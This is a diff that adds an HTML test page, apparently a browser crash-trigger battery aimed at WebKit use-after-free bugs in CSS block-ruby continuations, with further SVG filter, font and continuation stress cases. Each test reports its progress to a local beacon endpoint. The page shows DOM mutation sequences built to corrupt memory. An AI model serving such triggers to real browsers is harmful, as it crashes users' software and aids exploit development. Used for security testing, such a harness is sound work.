@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1068</title>
+<style>
+body{background:#0a0e14;color:#c8d0da;font:11px/1.5 monospace;padding:10px;margin:0}
+#hud{background:#111820;border:1px solid #1e2a3a;border-radius:6px;padding:10px;max-height:95vh;overflow-y:auto}
+.ok{color:#22c55e}.fail{color:#ef4444}.warn{color:#f59e0b}.info{color:#38bdf8}
+h2{color:#7dd3fc;margin:8px 0 4px;font-size:13px}
+</style>
+</head>
+<body>
+<div id="hud"></div>
+<div id="sandbox" style="position:absolute;left:-9999px;top:-9999px;width:800px;height:600px;overflow:hidden"></div>
+<script>
+var _rl='';
+setInterval(function(){
+  try{var x=new XMLHttpRequest();x.open('GET','/reload.txt?'+Date.now(),false);x.send();
+    if(x.status===200){var v=x.responseText.trim();if(_rl&&v!==_rl)location.reload(true);_rl=v;}
+  }catch(e){}
+},2500);
+
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET','/beacon.php?tag=P1068-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);x.send();}catch(e){}}
+
+var hud=document.getElementById('hud');
+var sandbox=document.getElementById('sandbox');
+function log(cls,msg){
+  var d=document.createElement('div');d.className=cls;d.textContent=msg;hud.appendChild(d);
+  hud.scrollTop=hud.scrollHeight;
+}
+
+bn('BOOT','css-ruby-uaf-svgfilter');
+log('info','=== P1068: CSS Ruby UAF + SVG Filter Battery ===');
+
+var tests=[];var testIdx=0;
+function addTest(name,fn){tests.push({name:name,fn:fn});}
+function runNext(){
+  if(testIdx>=tests.length){
+    bn('DONE','all-'+tests.length+'-complete');
+    log('ok','=== ALL TESTS COMPLETE ===');
+    return;
+  }
+  var t=tests[testIdx];testIdx++;
+  bn('PRE-'+t.name,'starting');
+  log('info','['+testIdx+'/'+tests.length+'] '+t.name);
+  try{
+    t.fn(function(result){
+      bn('POST-'+t.name,String(result).slice(0,500));
+      log(String(result).indexOf('CRASH')>=0?'fail':'ok','  -> '+result);
+      setTimeout(runNext,50);
+    });
+  }catch(e){
+    bn('ERR-'+t.name,e.message);
+    log('fail','  ERR: '+e.message);
+    setTimeout(runNext,50);
+  }
+}
+
+function clearSandbox(){sandbox.innerHTML='';}
+
+// ================================================================
+// SECTION A: CSS Ruby + Continuation UAF patterns
+// Target: WebKit Bug 271167 / 268770
+// display:block ruby with continuations can cause destroyRoot to be
+// freed by an earlier destroy() call in destroyAndCleanUpAnonymousWrappers
+// ================================================================
+
+// A1: Basic block ruby with inline continuation
+addTest('A1-BLOCK-RUBY-INLINE-CONT',function(cb){
+  clearSandbox();
+  var html='<div style="display:block ruby"><span>text<div style="display:block">break</div>more</span></div>';
+  sandbox.innerHTML=html;
+  // Force layout
+  void sandbox.offsetHeight;
+  // Now mutate: remove inner block to trigger continuation unwrap
+  setTimeout(function(){
+    var inner=sandbox.querySelector('div[style*="display:block"]');
+    if(inner&&inner.parentNode){
+      inner.parentNode.removeChild(inner);
+      void sandbox.offsetHeight; // force relayout
+    }
+    cb('OK-removed:'+(!inner?'none':'done'));
+  },50);
+});
+
+// A2: Nested ruby with block child insertion/removal
+addTest('A2-NESTED-RUBY-BLOCK-CHILD',function(cb){
+  clearSandbox();
+  sandbox.innerHTML='<div style="display:block ruby"><ruby>base<rt>anno</rt></ruby></div>';
+  void sandbox.offsetHeight;
+  // Insert block child into ruby to force continuation
+  var ruby=sandbox.querySelector('ruby');
+  var blk=document.createElement('div');
+  blk.style.display='block';
+  blk.textContent='inserted-block';
+  if(ruby)ruby.appendChild(blk);
+  void sandbox.offsetHeight;
+  // Remove it
+  setTimeout(function(){
+    if(blk.parentNode)blk.parentNode.removeChild(blk);
+    void sandbox.offsetHeight;
+    cb('OK-cycle:done');
+  },50);
+});
+
+// A3: Rapid ruby display toggling
+addTest('A3-RUBY-DISPLAY-TOGGLE',function(cb){
+  clearSandbox();
+  var container=document.createElement('div');
+  container.innerHTML='<span>before</span><ruby>base<rt>anno</rt></ruby><span>after</span>';
+  sandbox.appendChild(container);
+  var toggles=0;
+  for(var i=0;i<20;i++){
+    container.style.display=(i%2===0)?'block ruby':'block';
+    void sandbox.offsetHeight;
+    toggles++;
+  }
+  cb('OK-toggles:'+toggles);
+});
+
+// A4: Ruby with continuation + adoptNode
+addTest('A4-RUBY-CONTINUATION-ADOPT',function(cb){
+  clearSandbox();
+  // Create complex ruby structure in a separate document
+  var parser=new DOMParser();
+  var doc2=parser.parseFromString('<html><body><div style="display:block ruby"><span>x<div>block</div>y</span><ruby>base<rt>rt</rt></ruby></div></body></html>','text/html');
+  var rubyDiv=doc2.querySelector('div[style*="ruby"]');
+  if(rubyDiv){
+    var adopted=document.adoptNode(rubyDiv);
+    sandbox.appendChild(adopted);
+    void sandbox.offsetHeight;
+    // Now remove children rapidly
+    while(adopted.firstChild)adopted.removeChild(adopted.firstChild);
+    void sandbox.offsetHeight;
+  }
+  cb('OK-adopted:'+(rubyDiv?'yes':'no'));
+});
+
+// A5: Deep nested ruby with block splitting
+addTest('A5-DEEP-NESTED-RUBY-SPLIT',function(cb){
+  clearSandbox();
+  var html='';
+  html+='<div style="display:block ruby">';
+  html+='<span>';
+  for(var i=0;i<5;i++){
+    html+='<ruby>base'+i+'<rt>rt'+i+'</rt></ruby>';
+    html+='<div style="display:block">blk'+i+'</div>';
+  }
+  html+='</span>';
+  html+='</div>';
+  sandbox.innerHTML=html;
+  void sandbox.offsetHeight;
+  // Remove all block children to unwrap continuations
+  var blocks=sandbox.querySelectorAll('div[style*="display:block"]');
+  for(var j=blocks.length-1;j>=0;j--){
+    if(blocks[j].parentNode)blocks[j].parentNode.removeChild(blocks[j]);
+  }
+  void sandbox.offsetHeight;
+  cb('OK-removed:'+blocks.length);
+});
+
+// A6: Ruby with innerHTML replacement during layout
+addTest('A6-RUBY-INNERHTML-RELAYOUT',function(cb){
+  clearSandbox();
+  var outer=document.createElement('div');
+  outer.style.display='block ruby';
+  outer.innerHTML='<span>txt<div>blk</div>more<ruby>b<rt>r</rt></ruby></span>';
+  sandbox.appendChild(outer);
+  void sandbox.offsetHeight;
+  // Replace innerHTML while layout is dirty
+  outer.innerHTML='<ruby>new<rt>ann</rt></ruby>';
+  void sandbox.offsetHeight;
+  outer.innerHTML='<span>txt<div>blk</div>more<ruby>b<rt>r</rt></ruby></span>';
+  void sandbox.offsetHeight;
+  outer.innerHTML='';
+  void sandbox.offsetHeight;
+  cb('OK-replaced:4');
+});
+
+// A7: Ruby inside flexbox with continuation
+addTest('A7-RUBY-FLEX-CONTINUATION',function(cb){
+  clearSandbox();
+  sandbox.innerHTML='<div style="display:flex"><div style="display:block ruby"><span>x<div>blk</div>y</span></div></div>';
+  void sandbox.offsetHeight;
+  // Remove and re-add
+  var rubyDiv=sandbox.querySelector('div[style*="ruby"]');
+  if(rubyDiv&&rubyDiv.parentNode){
+    var parent=rubyDiv.parentNode;
+    parent.removeChild(rubyDiv);
+    void sandbox.offsetHeight;
+    parent.appendChild(rubyDiv);
+    void sandbox.offsetHeight;
+  }
+  cb('OK-flex-ruby:done');
+});
+
+// A8: Ruby with MutationObserver-triggered removal
+addTest('A8-RUBY-MUTOBS-REMOVE',function(cb){
+  clearSandbox();
+  var outer=document.createElement('div');
+  outer.style.display='block ruby';
+  outer.innerHTML='<span>a<div>blk1</div>b<div>blk2</div>c</span>';
+  sandbox.appendChild(outer);
+  void sandbox.offsetHeight;
+  var removed=0;
+  var obs=new MutationObserver(function(mutations){
+    mutations.forEach(function(m){
+      if(m.removedNodes.length>0){
+        // During removal of one block, remove another
+        var blocks=outer.querySelectorAll('div');
+        for(var i=0;i<blocks.length;i++){
+          if(blocks[i].parentNode){
+            blocks[i].parentNode.removeChild(blocks[i]);
+            removed++;
+          }
+        }
+      }
+    });
+  });
+  obs.observe(outer,{childList:true,subtree:true});
+  // Trigger first removal
+  var firstBlock=outer.querySelector('div');
+  if(firstBlock&&firstBlock.parentNode)firstBlock.parentNode.removeChild(firstBlock);
+  void sandbox.offsetHeight;
+  setTimeout(function(){
+    obs.disconnect();
+    cb('OK-removed:'+removed);
+  },100);
+});
+
+// A9: Ruby with display:contents children
+addTest('A9-RUBY-DISPLAY-CONTENTS',function(cb){
+  clearSandbox();
+  sandbox.innerHTML='<div style="display:block ruby"><div style="display:contents"><ruby>base<rt>ann</rt></ruby><div>block-child</div></div></div>';
+  void sandbox.offsetHeight;
+  var contents=sandbox.querySelector('div[style*="contents"]');
+  if(contents){
+    contents.style.display='block';
+    void sandbox.offsetHeight;
+    contents.style.display='contents';
+    void sandbox.offsetHeight;
+    if(contents.parentNode)contents.parentNode.removeChild(contents);
+    void sandbox.offsetHeight;
+  }
+  cb('OK-contents:done');
+});
+
+// A10: Massive ruby continuation stress
+addTest('A10-RUBY-MASS-CONTINUATION',function(cb){
+  clearSandbox();
+  var outer=document.createElement('div');
+  outer.style.display='block ruby';
+  var html='<span>';
+  for(var i=0;i<30;i++){
+    html+='text'+i+'<div>block'+i+'</div>';
+  }
+  html+='</span>';
+  outer.innerHTML=html;
+  sandbox.appendChild(outer);
+  void sandbox.offsetHeight;
+  // Remove all blocks at once via innerHTML
+  outer.querySelector('span').innerHTML='simple text only';
+  void sandbox.offsetHeight;
+  cb('OK-mass-unwrap:30');
+});
+
+// ================================================================
+// SECTION B: SVG Filter Chain UAF/Corruption
+// SVG filters involve complex buffer management and can trigger
+// integer overflows in dimension calculations
+// ================================================================
+
+// B1: SVG filter with extreme dimensions
+addTest('B1-SVG-FILTER-HUGE-DIM',function(cb){
+  clearSandbox();
+  var svg=document.createElementNS('http://www.w3.org/2000/svg','svg');
+  svg.setAttribute('width','100');svg.setAttribute('height','100');
+  svg.innerHTML='<defs><filter id="f1" x="-50%" y="-50%" width="200%" height="200%">'
+    +'<feGaussianBlur stdDeviation="999999"/>'
+    +'<feOffset dx="2147483647" dy="2147483647"/>'
+    +'<feComposite operator="over"/>'
+    +'</filter></defs><rect width="100" height="100" filter="url(#f1)" fill="red"/>';
+  sandbox.appendChild(svg);
+  void sandbox.offsetHeight;
+  cb('OK-huge-filter:rendered');
+});
+
+// B2: SVG filter chain with many stages
+addTest('B2-SVG-FILTER-DEEP-CHAIN',function(cb){
+  clearSandbox();
+  var svg=document.createElementNS('http://www.w3.org/2000/svg','svg');
+  svg.setAttribute('width','100');svg.setAttribute('height','100');
+  var filterHtml='<defs><filter id="f2">';
+  for(var i=0;i<50;i++){
+    filterHtml+='<feColorMatrix type="rotate" values="'+(i*7)+'" result="r'+i+'"/>';
+    if(i>0)filterHtml+='<feComposite in="r'+i+'" in2="r'+(i-1)+'" operator="over" result="c'+i+'"/>';
+  }
+  filterHtml+='</filter></defs><rect width="100" height="100" filter="url(#f2)" fill="blue"/>';
+  svg.innerHTML=filterHtml;
+  sandbox.appendChild(svg);
+  void sandbox.offsetHeight;
+  // Now remove filter while rendering might be in progress
+  var filter=svg.querySelector('filter');
+  if(filter)filter.parentNode.removeChild(filter);
+  void sandbox.offsetHeight;
+  cb('OK-deep-chain:'+50);
+});
+
+// B3: SVG filter reference cycle (filter referencing itself)
+addTest('B3-SVG-FILTER-REF-CYCLE',function(cb){
+  clearSandbox();
+  var svg=document.createElementNS('http://www.w3.org/2000/svg','svg');
+  svg.setAttribute('width','100');svg.setAttribute('height','100');
+  svg.innerHTML='<defs>'
+    +'<filter id="fa"><feImage href="#target"/></filter>'
+    +'<filter id="fb"><feImage href="#source"/></filter>'
+    +'</defs>'
+    +'<rect id="source" width="50" height="50" filter="url(#fa)" fill="red"/>'
+    +'<rect id="target" width="50" height="50" x="50" filter="url(#fb)" fill="blue"/>';
+  sandbox.appendChild(svg);
+  void sandbox.offsetHeight;
+  cb('OK-ref-cycle:rendered');
+});
+
+// B4: SVG feTurbulence with overflow-prone seed
+addTest('B4-SVG-TURBULENCE-SEED',function(cb){
+  clearSandbox();
+  var svg=document.createElementNS('http://www.w3.org/2000/svg','svg');
+  svg.setAttribute('width','100');svg.setAttribute('height','100');
+  var seeds=[0,1,-1,2147483647,-2147483648,4294967295,0x7FFFFFFF,0x80000000];
+  var html='<defs>';
+  for(var i=0;i<seeds.length;i++){
+    html+='<filter id="turb'+i+'"><feTurbulence type="turbulence" baseFrequency="0.05" numOctaves="2" seed="'+seeds[i]+'"/></filter>';
+  }
+  html+='</defs>';
+  for(var j=0;j<seeds.length;j++){
+    html+='<rect x="'+(j*12)+'" width="10" height="10" filter="url(#turb'+j+')"/>';
+  }
+  svg.innerHTML=html;
+  sandbox.appendChild(svg);
+  void sandbox.offsetHeight;
+  cb('OK-seeds:'+seeds.length);
+});
+
+// B5: SVG filter removal during animation
+addTest('B5-SVG-FILTER-ANIM-REMOVE',function(cb){
+  clearSandbox();
+  var svg=document.createElementNS('http://www.w3.org/2000/svg','svg');
+  svg.setAttribute('width','200');svg.setAttribute('height','200');
+  svg.innerHTML='<defs><filter id="fblur"><feGaussianBlur stdDeviation="5">'
+    +'<animate attributeName="stdDeviation" values="0;20;0" dur="0.1s" repeatCount="indefinite"/>'
+    +'</feGaussianBlur></filter></defs>'
+    +'<circle cx="100" cy="100" r="50" filter="url(#fblur)" fill="green"/>';
+  sandbox.appendChild(svg);
+  // Let animation run briefly then yank the filter
+  setTimeout(function(){
+    var filter=svg.querySelector('filter');
+    if(filter)filter.parentNode.removeChild(filter);
+    void sandbox.offsetHeight;
+    // Re-add with different structure
+    var defs=svg.querySelector('defs')||document.createElementNS('http://www.w3.org/2000/svg','defs');
+    defs.innerHTML='<filter id="fblur"><feFlood flood-color="red"/></filter>';
+    if(!defs.parentNode)svg.insertBefore(defs,svg.firstChild);
+    void sandbox.offsetHeight;
+    cb('OK-anim-remove:done');
+  },80);
+});
+
+// ================================================================
+// SECTION C: Font/Text Layout Edge Cases
+// ================================================================
+
+// C1: FontFace rapid load/unload
+addTest('C1-FONTFACE-RAPID-CYCLE',function(cb){
+  clearSandbox();
+  if(typeof FontFace==='undefined'){cb('SKIP-no-FontFace');return;}
+  var count=0;
+  // Create and immediately discard FontFace objects
+  for(var i=0;i<50;i++){
+    try{
+      var ff=new FontFace('test'+i,'url(data:font/woff2;base64,d09GMk9UVE8AAAA)');
+      ff.load().catch(function(){});
+      count++;
+    }catch(e){}
+  }
+  // Force GC pressure
+  var waste=[];
+  for(var j=0;j<1000;j++)waste.push(new ArrayBuffer(1024));
+  waste=null;
+  setTimeout(function(){cb('OK-fonts:'+count);},100);
+});
+
+// C2: Very long text with complex ruby
+addTest('C2-LONG-RUBY-TEXT',function(cb){
+  clearSandbox();
+  var html='<div style="display:block ruby;width:200px">';
+  for(var i=0;i<100;i++){
+    html+='<ruby>'+String.fromCharCode(0x4E00+i)+'<rt>rt'+i+'</rt></ruby>';
+  }
+  html+='</div>';
+  sandbox.innerHTML=html;
+  void sandbox.offsetHeight;
+  // Resize container to force re-layout
+  sandbox.style.width='100px';
+  void sandbox.offsetHeight;
+  sandbox.style.width='800px';
+  void sandbox.offsetHeight;
+  cb('OK-long-ruby:100');
+});
+
+// ================================================================
+// SECTION D: CSS Continuation Edge Cases
+// Continuations are created when block elements appear inside inline elements
+// ================================================================
+
+// D1: Classic inline-block continuation with ruby
+addTest('D1-INLINE-BLOCK-RUBY-CONT',function(cb){
+  clearSandbox();
+  sandbox.innerHTML='<span style="display:inline"><ruby>base<rt>ann</rt></ruby><div style="display:block">break-inline</div><ruby>base2<rt>ann2</rt></ruby></span>';
+  void sandbox.offsetHeight;
+  // Remove the block to unwrap continuation
+  var blk=sandbox.querySelector('div[style*="block"]');
+  if(blk&&blk.parentNode)blk.parentNode.removeChild(blk);
+  void sandbox.offsetHeight;
+  cb('OK-inline-cont:done');
+});
+
+// D2: Deeply nested continuations
+addTest('D2-DEEP-CONTINUATIONS',function(cb){
+  clearSandbox();
+  var html='<span>a';
+  for(var i=0;i<10;i++){
+    html+='<span>n'+i+'<div>blk'+i+'</div>';
+  }
+  for(var j=0;j<10;j++)html+='</span>';
+  html+='</span>';
+  sandbox.innerHTML='<div style="display:block ruby">'+html+'</div>';
+  void sandbox.offsetHeight;
+  // Remove all at once
+  sandbox.querySelector('div[style*="ruby"]').innerHTML='';
+  void sandbox.offsetHeight;
+  cb('OK-deep-cont:10');
+});
+
+// D3: Continuation with cloneNode
+addTest('D3-CONT-CLONENODE',function(cb){
+  clearSandbox();
+  var el=document.createElement('div');
+  el.style.display='block ruby';
+  el.innerHTML='<span>text<div>block</div>more</span>';
+  sandbox.appendChild(el);
+  void sandbox.offsetHeight;
+  // Clone deeply
+  var clone=el.cloneNode(true);
+  sandbox.appendChild(clone);
+  void sandbox.offsetHeight;
+  // Remove original
+  sandbox.removeChild(el);
+  void sandbox.offsetHeight;
+  // Modify clone
+  clone.innerHTML='';
+  void sandbox.offsetHeight;
+  cb('OK-clone-cont:done');
+});
+
+// D4: Range operations on continuation boundaries
+addTest('D4-RANGE-CONTINUATION',function(cb){
+  clearSandbox();
+  sandbox.innerHTML='<div style="display:block ruby" id="rng-target"><span>before<div>block-mid</div>after</span></div>';
+  void sandbox.offsetHeight;
+  var target=document.getElementById('rng-target');
+  if(target){
+    var range=document.createRange();
+    range.selectNodeContents(target);
+    var frag=range.extractContents();
+    void sandbox.offsetHeight;
+    // Re-insert
+    target.appendChild(frag);
+    void sandbox.offsetHeight;
+    // Extract again
+    range.selectNodeContents(target);
+    range.deleteContents();
+    void sandbox.offsetHeight;
+  }
+  cb('OK-range-cont:done');
+});
+
+// D5: Rapid style changes forcing continuation create/destroy
+addTest('D5-RAPID-CONT-STYLE',function(cb){
+  clearSandbox();
+  var outer=document.createElement('div');
+  outer.style.display='block ruby';
+  var inner=document.createElement('span');
+  inner.innerHTML='text<div id="toggler">block</div>more';
+  outer.appendChild(inner);
+  sandbox.appendChild(outer);
+  var toggler=document.getElementById('toggler');
+  var cycles=0;
+  for(var i=0;i<30;i++){
+    toggler.style.display=(i%2===0)?'inline':'block';
+    void sandbox.offsetHeight;
+    cycles++;
+  }
+  cb('OK-rapid-style:'+cycles);
+});
+
+// ================================================================
+// SECTION E: Combined Ruby + SVG attacks
+// ================================================================
+
+// E1: Ruby inside foreignObject in SVG
+addTest('E1-RUBY-IN-FOREIGNOBJECT',function(cb){
+  clearSandbox();
+  var svg=document.createElementNS('http://www.w3.org/2000/svg','svg');
+  svg.setAttribute('width','200');svg.setAttribute('height','200');
+  svg.innerHTML='<foreignObject width="200" height="200">'
+    +'<div xmlns="http://www.w3.org/1999/xhtml" style="display:block ruby">'
+    +'<span>text<div>block</div>more<ruby>base<rt>ann</rt></ruby></span>'
+    +'</div></foreignObject>';
+  sandbox.appendChild(svg);
+  void sandbox.offsetHeight;
+  // Remove foreignObject content
+  var fo=svg.querySelector('foreignObject');
+  if(fo)fo.innerHTML='';
+  void sandbox.offsetHeight;
+  cb('OK-ruby-in-fo:done');
+});
+
+// E2: SVG <use> with ruby content
+addTest('E2-SVG-USE-RUBY',function(cb){
+  clearSandbox();
+  var svg=document.createElementNS('http://www.w3.org/2000/svg','svg');
+  svg.setAttribute('width','200');svg.setAttribute('height','200');
+  svg.innerHTML='<defs><foreignObject id="fo-def" width="100" height="100">'
+    +'<div xmlns="http://www.w3.org/1999/xhtml" style="display:block ruby">'
+    +'<ruby>b<rt>r</rt></ruby><div>blk</div>'
+    +'</div></foreignObject></defs>'
+    +'<use href="#fo-def"/><use href="#fo-def" x="100"/>';
+  sandbox.appendChild(svg);
+  void sandbox.offsetHeight;
+  // Remove def
+  var defs=svg.querySelector('defs');
+  if(defs)defs.innerHTML='';
+  void sandbox.offsetHeight;
+  cb('OK-use-ruby:done');
+});
+
+log('info','Starting '+tests.length+' tests...');
+setTimeout(runNext,100);
+</script>
+</body>
+</html>
